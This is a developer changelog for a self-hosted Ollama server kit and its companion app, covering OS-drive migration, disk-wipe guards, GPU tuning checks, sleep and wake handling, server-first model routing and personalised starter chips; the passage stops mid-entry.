## 6b374 — setup.sh works on a server moved with migrate-os (kit)

- Pat's server after the move: the system and the models on ONE NVMe (plain
  partitions: `/` ext4 on p3, `/boot` p2, ESP p1, `/srv/models` p4), the
  mirror on its own, setup.env still naming the old drive as OS_SERIAL.
  `setup.sh --dash graphic` stopped: "/ is not on the disk with serial <old>;
  refusing to touch any disk". That refusal is right and stays.
- The disk guards left setup.sh for `lib/setuplib.sh` (so the tests run
  them): `check_disks`, `plan_wipes`, `models_done`, `raid_done`, `root_disk`,
  `root_on_lvm`, `show_disks`. New layout "models on the OS disk": allowed
  only when OS_SERIAL == MODELS_SERIAL (same disk) AND `/srv/models` is
  mounted from a partition of that disk that is not the root filesystem.
  Then `models_done` is true, `plan_wipes` lists nothing for it, and nothing on
  the disk is touched. If it is not mounted from there: die ("never wipes the
  OS disk"). A mirror disk can never be the OS disk; two roles can never share
  a disk otherwise; `plan_wipes` and `models_step` each refuse the OS disk
  too. A stale OS_SERIAL still dies, and when `/` and `/srv/models` are both on
  the models disk the message gives the one line that fixes it.
- Step 3 (grow the root LV) is `grow_root_if_lvm`: skipped with a note when `/`
  is not a logical volume; no vgs, lvextend or partition command ever runs
  on a plain-partition root. The plan line says so.
- `migrate-os --finish` rewrites `/etc/ollama1/setup.env` (`rewrite_setup_env`,
  `update_setup_env`): OS_SERIAL and MODELS_SERIAL both to the new drive's
  serial; atomic (temp file beside it, fsync, rename), same owner/mode, every
  other line and its order kept, missing keys appended; a missing file or a
  failed write only prints the one-line setup command (never fails finish).
  For an already-moved server: `sudo ./setup.sh --os-serial X --models-serial X`
  (setup.env keeps the rest).
- Tests: `TestOsAndModelsOnOneDisk` and `TestRootNotOnLvm` in
  `test_setuplib.py` (the exact scenario: guards pass, WIPES=0, no disk
  writes; the models-elsewhere variant still wipes only that disk; same disk
  with `/srv/models` unmounted, mounted elsewhere or the root itself dies),
  `TestSetupEnvAfterTheMove` in `test_migrate_efi.py`; fakecmd learned
  `findmnt -no SOURCE` and the device tree walk; 15 mutants.
- Not run: setup.sh itself on any real machine.

## 6b373 — migrate-os: reading `efibootmgr -v`, reusing the entry, and an optional way to stop the old drive booting (kit)

- Branch note: migrate-os (6b362) was not on main yet, so `kit-fixes-1004`
  carries it by a merge of `origin/migrate-os`; these fixes sit on top of it.
- The final firmware stage stopped with "efibootmgr made no entry labelled
  ollama1-new" although the entry existed (twice). The reader assumed one
  shape of `efibootmgr -v`: label, tab, `HD(...)/File(...)`. Now `parse_efi`
  handles a tab or only spaces after the label (a label can hold spaces and
  device words: "UEFI: Built-in EFI Shell", "PCI HD ..."), entries with and
  without the `*`, a `File(...)` loader or a bare path, trailing data after
  the loader (`\EFI\BOOT\BOOTX64.EFI0000424f`, Boot0003 style), CRLF, and
  the same entry under several numbers (`entries_for`, `norm_loader`,
  `same_loader`: FAT is not case sensitive).
- The firmware stage is idempotent: an entry for the new ESP's PARTUUID and
  the loader path `\EFI\o1new\<loader>` that already exists (any label,
  the one labelled ollama1-new preferred, the lowest number when it is listed
  twice) is reused, and made active if it was not; no second `efibootmgr -c`.
  The new entry's duplicates are left out of `BootOrder`. When no entry can
  be found after making one, the stop says how many entries the list has and
  what is on that ESP, and that `--resume` reuses it.
- `find_old_entry` no longer returns nothing when several entries share the
  old ESP (ubuntu's, the `\EFI\BOOT` fallback, duplicates): the distro's own
  loader first, then the earliest in the boot order.
- New, **off by default**: `--finish --disable-old-boot-files`. After the move
  the server's firmware kept re-ordering `BootOrder` and booting the old
  drive. This renames `EFI/ubuntu` and `EFI/BOOT` on the old drive's EFI
  partition to `*.off` so it has nothing to boot. It is the one step that
  writes to the old drive: only its ESP, found by the PARTUUID the tool
  recorded (never guessed, vfat only), mounted just for this, asks `yes`,
  writes the undo (`/srv/data/old-drive-boot-files-undo.txt`: mount and `mv`
  back) before the first rename, refuses when a `.off` is already in the way,
  repeating it is a no-op. The firmware entries are not touched by it.
- Tests: `tests/test_migrate_efi.py` (parser against real-looking samples,
  duplicates, the stage on a fake server with spaces / bare paths / an entry
  from a stopped run / one listed twice / inactive / none appearing, and the
  old-boot-files step) and ten mutants in `mutate.py` ("migrate: ..." from
  "no tab after the label"). `fakemigrate.py` can print the list those ways
  (`sep`, `bare`, `trail`) and make an entry on another ESP.
- Unverified on the real server: that spaces/bare paths are what its
  efibootmgr printed (the log showed only the failure); the reader now takes
  every shape named above.

## 6b372 — the graphics card check no longer reverts on one slow reading (kit)

- The load check reverted a fine card: "answers were slower than stock
  (148.7 against 249.5 tokens/s)", measured while a drive and an engine were
  failing. The old rule compared one 60 s tuned run with a stock figure taken
  days earlier (when tuning was turned on), in whatever state the server was.
- Now a slow first reading only starts a repeat (`confirm_slowdown`): stock
  and tuned are measured again, alternating `CONFIRM_ROUNDS` (2) times, 20 s
  each. Revert only if every alternation is more than 5% slower AND the
  medians are; the reason names what was measured ("slower than stock in 2 of
  2 repeats (median tuned .. against median stock .., limit 95%; tuned
  a/b/c, stock d/e ...)"). A repeat that is fine passes ("didn't repeat").
- Defer, don't revert, when the reading can't be trusted (`self.noise`, from
  `_load`): NVMe errors in the kernel log since the values were applied
  (`nvme_errors`: I/O timeouts, controller down, I/O errors on nvme devices),
  another model loaded during the load (a model resident from the start, like
  an embedding model, is not noise), the card already 35% busy or more before
  the load (lowest of three looks), an answer that failed partway, or repeats
  that didn't finish. The check is recorded as `deferred`, `pending()` stays
  true, so it runs again next boot; the tuned values stay applied.
- Unchanged: real amdgpu errors (also during a repeat), 105 C junction and
  100 C memory revert at once; so does Ctrl-C mid-check, a check the machine
  never finished, and an amdgpu error in the previous boot's log.
- Tests: `TestSlowdownIsNotReverted` in `tests/test_gputune.py` (the incident,
  a slowdown that repeats, one that doesn't, each noise source, safety
  reverts still firing, Ctrl-C in the repeats, the NVMe regex) and seven
  mutants in `tests/mutate.py`.

## 6b371 — the check after a wake waits for the card and the models drive (kit)

- After a wake the record once read "Ollama didn't answer; restarted Ollama
  and the tunnel; Ollama STILL NOT ANSWERING". The old check looked once,
  restarted Ollama at once and looked again, with no wait for what Ollama
  needs: right after a suspend the amdgpu driver (ROCm/KFD) and the NVMe
  holding `/srv/models` come back after the hook has run, and a restart in
  that gap starts Ollama into a card it can't use (`ollama1-wait-gpu` only
  covers a service start, and gives up after 90 s and starts anyway). Also
  possible: the check's own 60 s look being short, and the check racing
  `ollama1-gpu-tune.service`, which the same hook starts.
- `o1sleep.resume_check` now: healthy -> done at once (no waiting when all is
  well). Otherwise it waits, bounded (90 s), for the card (`gpu_ok`, only
  when an AMD card is on the PCI bus: `gpu_expected`) and the models drive
  (`models_ok`: listable, and a mount or not empty), looks at Ollama again
  (it was only slow: no restart), restarts Ollama and the tunnel, and if it
  still doesn't answer, waits again for whatever was missing and restarts
  once more. A whole-check budget of 8 minutes; the unit allows 15 and runs
  after `ollama1-gpu-tune.service`.
- The record carries the why: `detail` ("Ollama didn't answer; after 90 s
  still missing: the graphics card; restarted ... again: Ollama STILL NOT
  ANSWERING") and `waited_s`, `gpu_ready`, `models_ready`, `restarts`.
  Existing keys (`ok`, `detail`, `at`) are unchanged.
- Tests (fake clock and fakes): `TestResumeCheck` in `tests/test_sleep.py`;
  mutants for no wait, no retry, unbounded wait, no reason.
- Unverified on the real server: that the missing card/drive really is the
  cause. The next failed wake will now say which.

## 6b370 — the auto sleep setting is proven to stay saved (kit)

- Patrick's report: the setting looked like it didn't stick. Server side it
  does, and now tests say so: `tests/test_sleepcfg.py`. The setting is
  `/var/lib/ollama1-gateway/sleep.json` (the gateway's StateDirectory, user
  `o1gw`, mode 0600), not the `/var/lib/ollama1/sleep.json` record that holds
  the last sleep/wake and the resume check. Tests: a new Gateway object (a
  restart) and a new `Idle` read it back; it isn't under `/run`; no temp file
  is left; a failed write keeps the old one; `setup.sh` (any flag) never
  names it, writes it or removes the folder; tmpfiles doesn't clean it.
- One real gap closed: `write_json_atomic(sync_dir=True)` now also flushes the
  folder after the rename (the file was flushed, the rename was not), so a
  power cut right after Save can't bring the old file back. Only
  `write_config` uses it.
- `sudo ollama1-idle status` prints the saved setting (and whether deep sleep
  is supported). The nightly backup now includes the file (`settings.tar.gz`).
- `/run/ollama1/idle.json` now also carries `enabled` (bool) and `minutes`
  (int), the saved setting, rewritten every tick; the graphical server panel
  shows "Sleeps in mm:ss" from it. Test: `TestIdleFilePublishesTheSetting`.
- README: the stale "automatic idle sleep is on hold" line is replaced by what
  it does and where the setting lives. The app reading the setting back is
  the app's side, not the kit's.
## 6b390 — the starter chips follow what you ask about (per Patrick)

Patrick (2026-10-04): the three chips above the composer came from a fixed pool.
"If a person often asks about car repairs and a few times about cooking, show two
car-repair chips and one healthy-eating chip." Chat lane only; the Code and Funnel
lanes keep their own sets.

- **What is read.** Only a topic summary: the titles of the newest 30 chat-lane
  chats (a chat with no title, or a "(copy)", gives its first question instead),
  scrubbed (no address, link or 4+ digit number) and cut to 60 characters. Never a
  message, an answer, a Code or Funnel chat, or a label that touches
  `_TENDER_RX` (health, a relationship, grief: so "Battery keeps dying" is left
  out too, "dying" is in the pattern; deliberate, the home screen is the one place
  someone else might read over a shoulder). Fewer than 3 labels: the pool.
- **Who writes them** (`suggest_ask`): the person's server first
  (`server_side_text`, 6b357's rule), else a model of this computer that is
  ALREADY loaded and capable (>= 2.4 GB; a side pass never loads one; none up is
  "no model free" and the pool stays), and in Cloud Only the cloud's quick model
  (`fast_cloud_ladder(utility=True)` behind `gate_ladder`) and nothing else, never
  a server or a local model, as the title pass (6b357). The cloud is therefore
  asked only by someone who chose Cloud Only, at most once a quarter hour while no
  summary exists and once per 6 h after; a failed call costs nothing.
- **One call** groups the labels into at most 4 topics with counts and writes 3
  starter questions each (`SUGGEST_PROMPT`; `TOPIC: x | COUNT: n` then `- chip`
  lines). `suggest_parse` keeps only chips that pass `_suggest_chip`: 8-48
  characters, at least two words, no address, link, 4+ digits, no tender topic, no
  collapsed text, none sharing a word with the person's `user_name` or
  `home_area`, none a near copy (word overlap >= 0.7) of a chat title; a missing
  emoji becomes 💡. Fewer than two good chips overall is nothing.
- **Kept** in the profile's own `suggest.json` (`PERSONAL_NAMES`, so it is the
  profile's and never the machine's): `{v, sig, n, tried, at, checked, topics:
  [{topic, n, chips}], made}`. Erased with "Forget chats" and when the switch goes
  off. A pass is **due** when there is no summary (a quarter hour apart), or the
  summary was made or last looked at over 6 h ago, and then asks only if the
  title list changed (`sig`); otherwise it just stamps `checked`. A pass that
  gave nothing is not repeated for 15 minutes. Refresh ignores age and sig.
- **Background, never in the way.** `GET /api/suggest` answers at once from the
  file and starts a pass behind it on `ctx_thread`; it is only called when the
  page paints the chat-lane chips, never to load the page or open a chat. A pass
  waits (`suggest_busy`) while an answer is streaming (`turns_live_count`), a
  benchmark runs or counts a hold, a model download is queued or running, or an
  update runs; held back, it writes nothing and asks again 90 s later. Any error
  is the pool.
- **Picking** (`suggest_pick`, per painting): two chips of the biggest topic, one
  of the next (a tie by lot), drawn afresh from the 3 each kept; the page puts
  them FIRST, then the fixed pool, and the existing one-row trim drops from the
  end. With 3 chips of about 30 characters all three fit at the composer's
  780 px; on a narrow window the trim leaves fewer, as for the pool.
- **Page.** `suggLoad()` (a look at most every 5 min; a few extra looks 4 s apart
  while the first pass runs, so the chips arrive without a reload; only the first
  answer repaints the row). State is `var`, not `let`: a painting that runs
  before the declaration would hit the temporal dead zone and kill the page.
- **Settings › Personality**: "Personalise suggestions" (`suggest_own`, a synced,
  typed setting, on unless saved off), one line saying what it reads and where it
  runs, "Refresh", and a status line.
- **Test hook** (dev copies): `suggest-fake` answers as a model would;
  `suggest-fake=unsafe` answers with chips that must all be refused;
  `suggest-fake=fail` answers nothing; `GET /api/test/suggest` says how many times
  the pass asked and what it sent.
- **Gauntlet** ("starter chips from your chats"): 60 unit checks over the labels,
  the chip filter, the picking, the model's route, busy, due and a whole pass on
  stand-ins; 22 source and page checks; 12 live checks on four copies (first look,
  topic mix, what is sent, the file, auth, the 6 h rule, switch off and on,
  Refresh, fewer than 3 chats, Forget, a benchmark running, unsafe and failing
  models); 65 mutants, each caught. The old synced-set check now names
  `suggest_own`.
- Not done: no benchmark of how well a 3B model groups titles (the filter and the
  pool are the safety net); a local model is used only if one is already loaded.

---
## 6b375 — the sleep setting shown is the server's, read back (app side; per Patrick)

- Patrick: once auto sleep is on with its minutes, it has to stay set on the server
  when the app is closed. The server keeping it is the kit's job (another build); the
  app's part is below.
- Audited: the app writes the setting in one place, `server_sleep_set`, which POSTs
  only the key the person changed (`enabled`, or `minutes`, 5 to 1440) to
  `/v1/sleep-config`; nothing else in the app posts to it (adding, pairing, checking,
  opening Settings and starting the app only GET). So the app edits and never
  re-asserts. The copy in servers.json (`sleep`, `wake`) is a cache for the wake rules
  and the page never reads it for the switch.
- Fixed in the page: before and after a failed read the card showed an unchecked
  "Sleep when idle" and a default "30" (disabled), i.e. it looked like "off, 30". Now the
  switch and the minutes appear only once the server has answered (`srvSleepView`
  `unknown`): "Reading it from the server..." while it loads, "Couldn't read the setting.
  The server isn't answering." when it didn't answer, and the error in words for the
  others (certificate, pairing lost, ...), with no controls. Each opening of the pane
  reads again and does not show the last opening's values meanwhile. A failed write
  keeps what the server last said and the card's line says why it didn't take
  (`srvSleepNext(prev, d, write)`); a successful write shows the server's own echo.
- Tests: the node check of the sleep pane (views, reads that fail, writes that fail, the
  markup without controls) and four new mutants.
- Not verified live: no paired server in the dev copy, so the card was not drawn
  against a real gateway.

## 6b369 — "<name> Only" on a sleeping server wakes it where the page can see (per Patrick)

- Patrick: with the engine chip on "Ollama1 Only" the question showed a tiny spinner
  and the stop button, the server never woke and nothing said why.
- Traced: `/api/chat` resolved "<name> Only" (`server_only_resolve`) BEFORE
  `send_response`, and that call made the check (up to 15 s) and then the wake
  (`server_wake`: the packet, then `/v1/info` every 2 s for up to 60 s) with no byte
  to the page, so there was no STATUS frame and no heartbeat yet (both start after the
  headers). Up to 75 s of an empty spinner, and a Stop only closed a socket the thread
  was not looking at. The wake notes ("Woke X." / "X didn't wake.") were drained after,
  as a status that is replaced at once.
- Now `server_only_resolve(sid, ctx, defer=True)` (the chat's call) checks but does not
  wake: `server_wake_if_down(..., defer=True)` records the server
  (`server_take_wake_pending`). After the headers and `status` exist the handler runs
  `server_only_wake`: "Waking <name>..." then "Waking <name>... 12 s" every poll, the
  Stop button (`_client_gone`) ends it within one poll, "<name> is awake." and the answer
  goes to that server's model, or one line in the chat: "<name> didn't wake up in 60
  seconds. It may be off or offline. Nothing was sent anywhere else." (the server is
  marked down for a minute, as before). The mode seats (Fast, Thinking, Pro) still wake in
  `server_refresh_modes` before the headers; they fall back to this computer, so nobody
  is left without an answer, but the 60 s of silence is the same there (not changed).
- The wake itself: the packet is `ff*6 + mac*16` (102 bytes), the cards are the ones the
  server's gateway reported on `/v1/sleep-config` (kept in servers.json as `wake`), and
  it now goes to UDP ports 9 and 7 (it was 9 only) of 255.255.255.255 and of each real
  private network's own broadcast address (`srv_bcast_for`: no tunnels, containers, VMs,
  /32, wider than /16). Still only for a paired server with sleep switched on and a card
  known, and only once in `SRV_WAKE_GAP_S` (5 minutes): a second try inside it sends
  nothing and reports the server as it stands.
- A server that has sleep on but no recorded card (the app never read the setting) now says
  so: "<name> didn't answer, and this app doesn't know how to wake it. Open Settings >
  Servers while it is on." instead of "didn't answer".
- Tests: `_w46c_only_wake` (deferred check; waits and says "Waking Desktop... 2 s";
  does not come up, one line, marked down; Stop; the gap; no card; the handler's order
  pinned) plus 5 mutants; the old wake tests now expect ports 9 and 7.
- Not verified: a real sleeping server end to end (no paired server in the dev copy; the
  handler's wiring is pinned in source and the chat path ran against a missing server).
  Whether a 60 s wait is long enough for a real resume plus tunnel is unknown; `SRV_WAKE_WAIT_S`
  is unchanged.

## 6b368 — a bigger arrow on the Settings Models row (per Patrick)

- The caret that opens Local / Cloud / Servers (6b350) was a 9px "▸" glyph with
  about 5px of ink. It is now a triangle drawn with borders in em, so it scales
  with the label: `.snav-chev` is 0 × 0 with `border-width:.32em 0 .32em .52em`,
  that is .64em tall (8px at the label's 12.5px) against a cap height of .70em
  (8.75px, measured with canvas `actualBoundingBoxAscent` of "H"): 91% of the
  cap height. Still a flex item of the row (`align-items:center`), still turns
  90 degrees when the group opens. The glyph is gone from the markup.
- Measured in the Browser pane (Blink; not WKWebView) with getBoundingClientRect:
  closed 6.5 × 8, centre offset from the row's centre 0; open 8 × 6.5 (rotated),
  offset 0, `matrix(0,1,-1,0,0,0)`.
- Test: the 6b350 rail check now pins the empty span and the border rule, with a
  sixth mutation that shrinks the triangle.

## 6b367 — Settings › Models › Servers: Test ends in a visible result

- Patrick: the Test button said "Checking" and went back to "Test" with nothing
  shown. The reply to a test is `{ok, server}` (the error is in the server's
  `status`), and the handler cleared the line when `d.err` was empty.
- Now `srvTestResult(server)` turns the check into one line: a green "OK ·
  Reachable · signed in · <card name> · Ollama <version> · <ms>", or the error in
  the app's own words from item 1/6b366 (offline, "took longer than N seconds
  to start answering", certificate, pairing lost, clock, Access, busy...), red.
  A server that answers but isn't paired is amber ("Reachable (9 ms), but not
  paired yet. Pair it first."). The line is held 8 s (`SRV_TEST_HOLD_MS`) or
  until the next press of any button on the card, whichever is first; a timer
  that fires after a newer message leaves it alone (`srvTestSeq`). `srvMsg` takes
  a kind (`ok`, `bad`, `warn`) and the card keeps it through a repaint.
- Seen in the dev copy (Browser pane): a dead address ends in "Dead didn't answer.
  It may be off, asleep or offline...", red, held, then cleared; a listener that
  accepts and never answers ends in "Slow took longer than 15 seconds to start
  answering." with the button disabled and "Checking…" until then. The green OK
  is covered in node only (no paired server in the dev copy).
- Tests: `_svc_testbtn` (node: every kind of result, the card's class; the handler
  and the hold pinned) with 5 mutants.

## 6b366 — a server benchmark waits for a cold load, and a failed call says what happened

- Found by reading code: `_BenchServer._open()` called `_srv_send(..., SRV_CONNECT_S=12, ...)`,
  and that one number was also the socket's wait for the reply's headers. A model
  that loads cold (gemma4:12b/26b, gpt-oss:20b) sends no header until it has
  loaded, so the load request timed out at 12 s. `_srv_send` then called every
  OSError "didn't answer. It may be off, asleep or offline" and every SSLError
  "certificate didn't check out" (a dropped tunnel is an SSLEOFError, not a
  certificate).
- `_srv_send(..., timeout, wait=None)`: `timeout` is the connect, the handshake and
  the send; `wait` is the first byte of the reply (default: the same, so every
  other caller is unchanged). The connect is its own step, so a timeout while
  waiting is told apart from one while connecting. The benchmark passes its
  call's own limit (the load: `BENCH_LOAD_CAP`, 300 s; the run: `BENCH_RUN_CAP`+30;
  `/api/ps`: 30), and the chat path (`server_stream`) passes its first-word wait
  (`SRV_FIRST_S`, or the mode's short `server_first_deadline`), so a cold chat
  load isn't cut at 12 s either.
- What it says now: a connect that fails or times out, a refusal: "<name> didn't
  answer. It may be off..." (kind offline, unchanged). A first byte that took too
  long: `ServerSlow` "<name> took longer than N seconds to start answering."
  (kind offline for the checks, `.slow` so the callers that look do not mark the
  server down, as 6b357). A reset, a close before the status line or a TLS EOF:
  "<name>'s connection dropped before it answered." Only
  `ssl.SSLCertVerificationError` and a handshake that names the certificate give
  kind `tls` ("certificate didn't check out"; `_srv_cert_failed`).
- The cloud benchmark's call has the same split: "the provider didn't answer"
  (not reached), "the provider took longer than 30 seconds to start answering",
  "the connection dropped", and the certificate line only for a certificate.
- Tests: `_svw_wire` (real sockets: late headers with and without `wait`, a closed
  line, a reset, refused, a TLS handshake that dies, a self-signed certificate,
  the SSL classifier) with 5 mutants; `_b41_cold_load` (a load whose header comes
  after 1.6 s on a 0.5 s connect, a provider that drops) with 3 mutants. The
  signature fakes in the gauntlet take `wait=None`.
- Not verified: against the real server and a real cold gemma4/gpt-oss load.

## 6b365 — the stability test runs one load at a time by default (per Patrick)

- `stability-test.sh` with no options ran "all" (cpu, memory and the card at
  once), so a crash could not name its cause. The default is now
  `cpu,gpu,memory`, 10 minutes each, and each phase is announced with a
  "NEXT: gpu for 10 min ... if the server crashes now, gpu is the one" line
  before it starts. `--phases ...,all` still adds the combined run.
  Test: `test_the_default_is_one_load_at_a_time`.

## 6b364 — the server sleeps with people logged in (per Patrick)

- Auto sleep never fired on a server with an open SSH tab or console login:
  `ollama1-idle` logged "not sleeping: someone is logged in" for the whole
  hour, because `decide()` refused whenever `loginctl` listed a session.
  An open terminal on an admin's computer is not use of the server. The
  session check (and its "couldn't ask who is logged in" twin) is gone from
  `decide()` and the probe is no longer run each tick. What still keeps it
  awake: a request in flight, a running download or tool (stability test,
  install...), a held block lock, a load average above 1.5, the graphics
  card at 10% or more, and the idle minutes since the last request.
- Tests: `test_a_login_does_not_block_sleep`; the two session mutants in
  `mutate.py` are gone with the check they guarded.
- A person at the keyboard running something long is still protected (a
  tool, load or the card is busy); a person only reading a log is not.

## 6b362 — moving the server's OS onto its other NVMe, in software (kit only, no app change)
Patrick (2026-10-02): "Is there a way we can clone the one NVMe to the other and
boot from the other one? Because I don't feel like ripping out the GPU just to
get an NVMe out of there." He accepts re-downloading models and wants it "as
simple and safe as possible". Then, same day: "how do we start cloning, then
have it reboot from the other nvme once done?" (so `--reboot`), and that the
coordinator, not he, runs it over SSH through a temporary narrow sudo rule.
The OS drive (the CPU-attached M.2 slot) repeatedly drops off the bus under load
("nvme controller is down; CSTS=0xffffffff", then ext4 goes read-only); the
models drive, on the chipset slot, is healthy. `ollama1/tools/migrate-os.sh`
+ `ollama1/lib/o1migrate.py`; docs in `ollama1/README.md` ("Moving the system to
the other drive").

THE CHOICE: copy (rsync), not `pvmove`. `vgextend` + `pvmove` rewrites the
volume group's metadata ON THE OLD DRIVE, moves every extent of `/` off it (the
old drive then boots only while the new one is also there and no longer holds
the system as it was) and, if the drive drops mid-move, leaves a VG with a
missing PV. The brief's own test was "keep the old drive bootable as a
fallback", so: `/` and `/boot` are copied onto plain ext4 partitions of the other
NVMe (new UUIDs, fstab rewritten ON THE COPY, initramfs and GRUB built in a
chroot), and the old drive is never written to. Consequences: the new root is
not LVM (so `setup.sh`, which assumes `ubuntu-vg` and a separate models disk,
stops at its first checks on a migrated server; not changed here, flagged in the
README); the old ESP is not copied (its stub points at the old `/boot`);
`/swap.img` is made new, not copied. No LVM command exists in the tool (a test
greps for it).

DESIGN
- Serials are arguments (`--from-serial`, `--to-serial`); nothing about a
  server is in the repo. Drives are found by sysfs serial (nvme0/nvme1 swap
  between boots), addressed only by `/dev/disk/by-id`, and the serial is read
  again immediately before every writing command (`check_target`).
- Stages 0 checks, 1 park (rsync to `/srv/data/models-parked`, verified by a
  dry run and sizes), 2 partition (ESP 1G, /boot 2G, / `--root-size`, models
  the rest), 3 copy, 4 boot (fstab, initramfs, grub-install --no-nvram,
  update-grub in a chroot; the copy's `grub.cfg` must carry the running
  kernel's options and the GRUB drop-ins must be on the copy), 5 restore,
  6 firmware (the boot entry, made LAST: new first, old second, old found by
  its ESP's PARTUUID; until then the old drive is the default boot). State in
  `/srv/data/o1migrate/state.json`, refused if that folder is on either NVMe;
  `--resume` after a crash; a typed serial or `--confirm-serial` (must equal
  `--to-serial`) once per run.
- Unattended (the coordinator's run): after the confirmation the tool starts
  itself again in a detached tmux session `migrate` (no terminal needed),
  writes `/srv/data/migrate-os.status` (0644, no serials: state, stage N of 6,
  percent, last line, times, next step; rewritten every 15 s) and a 0600 log,
  stops on any failure with `FAILED` and no reboot, and with `--reboot`
  reboots (10 s countdown, Ctrl-C cancels) only after every stage and check
  passed. Without `--reboot` an interactive run asks `[y/N]` (default no).
  `--status` (no sudo) diagnoses a status left by a reboot or crash. A systemd
  unit for that was not made: it would have to be installed on the old drive.
- `--finish` (no serials needed) checks `/`, `/boot`, `/boot/efi` and
  `/srv/models` are on the new drive and that the running `/proc/cmdline` has
  the old system's options (the NVMe power settings, `amdgpu.ppfeaturemask` when
  the GPU tuning is on, 6b361). The parked copy is deleted only on request, after
  the live copy is checked to hold every file.
- Delegation: `--install-remote [--sudoers-user NAME]` copies the script and
  library to `/usr/local/lib/ollama1-migrate` (root:root, 0755/0644), and adds
  one sudoers rule (written to a temp file, `visudo -cf`, 0440, the whole set
  checked again). As root the script runs only from a path of root-owned, not
  group/world-writable components (shell and Python both check), with `python3
  -I`, and ignores `O1M_*` overrides unless a test sets `O1M_TEST=1`. The rule is
  temporary; `--finish` reminds and offers to remove it.

SAFETY REVIEW, same day (second commit). An independent review found the tool not
safe unattended; fixed: (1) the old models partition's ext4 superblock sits where
the new ESP starts, so a probe after the wipe aborted the run: each new partition
is now wiped, always formatted and read back; (2) the firmware entry is BootNext
only, the old drive stays first until `--finish`, and the copy boots with
`panic=10`; (3) a final content compare (all files up to 64 MiB, 18 MiB spread
over larger ones; not a full checksum, which would take hours on a terabyte),
RAID `[UU]`/rw/md checks and a refusal to create the state folder off /srv/data
right before the wipe; (4) admin panel, pulls, restart and reboot units stop,
and the bare `/srv/models` is `chattr +i` while unmounted; (5) TO must hold
`/srv/models` and exactly one partition, duplicate serials refused, multipath
names resolved; (6) O_NOFOLLOW everywhere, root-owned and not-writable
`/srv/data` and state folder, state values validated, no `O1M_*` override as
root; (7) FROM may have no other mounts; (10) the ESP's grub.cfg stub is
checked; (12) the status file holds fixed phrases and numbers only; chroot binds
are unmounted in a `finally`. Tests and mutants for each.

NOT VERIFIED ON REAL HARDWARE: partitioning, the chroot's grub-install and
update-initramfs, the EFI entry, a firmware that ignores `BootOrder`, a real
drop-out during the copy, the shim path on this board's Secure Boot setting.
Tests (`test_migrate*.py`, 3 files) use fakes for every program; mutants in
`mutate.py` ("migrate: ...").

## 6b358 — a server added with no name is "My server"
Patrick (2026-10-02), asked whether to change the blank-name fallback for a new
server from "Desktop": "Call it \"My server\"". `server_add` now names it "My
server" (then "My server 2" and so on, the existing uniqueness rule), matching
the add form's placeholder ("Name: My server") and the "server, not desktop"
wording (6b347). Existing servers keep the names they have. The servers check's
names case now expects "My server" / "My server 2".

## 6b357 — the server trumps this computer: pictures and every side pass
Patrick (2026-10-02), answering whether a picture sent in a mode should go to the
server (6b344 found that "Writing the answer — Qwen 3.5 Vision 9B" is the
picture takeover, not the merge): "only send it to the Mac if the server
doesn't have a model that can handle it. Otherwise, for any user in any server,
the server trumps anything run on the local machine."
- **Pictures in a mode** (Fast, Thinking, Pro; `server_vision_pick`). A model
  of the person's server that fits its card under the seats' rules
  (`server_mode_candidates`: this profile's paired servers, "Use for Fast,
  Thinking and Pro" on, answering, "gpu" placement, fitting a reported card),
  that the server SAYS reads pictures (Ollama's `/api/show` "capabilities"
  holds "vision", asked through the gateway over the signed channel and
  remembered per server and model; no protocol change, no new endpoint), and
  is no coder, embedding or guard model, strongest first, at most six asked a
  turn. It takes the picture as the mode's seat (`server_first_answer`): the
  same first-word deadline, a failure marks the server down, and before its
  first word this computer's vision model answers (said in the status line, the
  badge "this Mac"); no download of the local vision engine is started while
  the server can read it. The cloud still reads it first when cloud power is on,
  as for every mode seat. Cloud Only, a pick of the person's own (a local model,
  a server model) and an Advanced council are untouched. The annotate grid
  (6b355) is already the picture in `images`, so whichever model reads it gets
  the grid copy. Funnels send no picture to any model (their pictures are web
  photos, 6b340), so there is nothing to route there.
- **The side passes** (`server_side_text`: the server's quick 7-15B model,
  `SRV_SIDE_FIRST_S` = 30 s to a first word; a failure marks it down and the
  caller runs what it ran before):
  - moved: the chat's title (`make_title`, after a cloud answer's own provider;
    an answer of the server's is still titled by that server or not at all), the
    memory pass for an answer of this computer's, the place-pin pass for one,
    an image prompt's rewrite (`_refine_with_model`), an export's title (a
    server turn's by that server, a seat's never locally), the rescue after
    every path went silent (the server's model first, unless it is the one that
    failed or the turn has a picture), the Remote agent's planner (the server's
    coder after the cloud ladder; a failed turn marks it down and the next
    resolve is this computer's), and Research (`server_compositor` plans and
    writes; before its first word this computer's writer, after one the brief
    is cut there and said).
  - already server-first: the modes' seats, councils and merge (6b339, 6b344),
    the Code lane's agents (`resolve_agent_seat`), funnel stages and verdicts,
    a server pick's and "<name> Only"'s title, memory and pins.
  - left on this computer on purpose: the benchmark (it measures this
    computer), dictation (whisper on this Mac; the server kit has no speech
    model), picture and video MAKING (FLUX and Wan; a server has no image
    generator), an explicit local pick (the person chose it), and Cloud Only.
- **The review of the merged side passes (two MEDIUM, fixed).**
  - Cloud Only is exempt from server-first (Pat's privacy rule: nothing of a
    Cloud Only chat goes to a server), and three sites broke it: the image
    follow-up's rewrite (`image_followup(..., server=not cloud_only)`), an
    export's title (`make_title(..., ask_server=not cloud_only)`) and
    `/api/title`, which carries no tier: the Cloud Only turn leaves a ticket
    (`_cloud_only_chats`, per profile and chat, voided by the chat's next
    request, five minutes) that the title route reads. The memory pass also
    skips the server under Cloud Only. Audit of every server-first call site:
    guarded or never in a Cloud Only chat: the merge (`srv_merge`), the picture
    reader (`_mode_pic`), the place pins and the rescue (`not cloud_only`), a
    picture or video made on the server (`not cloud_only`), the mode refresh
    (`not cloud_only`), funnels, Research and the Remote agent (their own
    lanes: Cloud Only answers before them). Fixed: the three above and the
    memory pass.
  - A time limit is not "down" (`ServerSlow`, a `ServerError` whose `slow` is
    true: a first word or a quiet stretch past the caller's limit, or a picture
    or video past its 5/20-minute cap). A side pass or a long job that hit one
    leaves the server for this computer, this once, and does NOT mark it down: a
    cold load of the 7-15B title model can outlast 30 s, and a healthy server
    must not be skipped for a minute. Refusals and connection failures still
    mark it down. The seats' and councils' own marking is unchanged.
- **The review of 6b344 (MED)**: the server merge caught every exception, so a
  Stop, a closed window or a profile switch while the server wrote the merge
  marked a healthy server down and, before the first word, started this Mac's
  multi-GB compositor for a client that was gone. `StaleProfile`,
  `BrokenPipeError` and `ConnectionResetError` now pass through first, as the
  seats' path does; every new server call here does the same.
- Tests: in process, the picture reader (capabilities, families, the strongest,
  six at most, remembered, none with no server, the switch off, an error or no
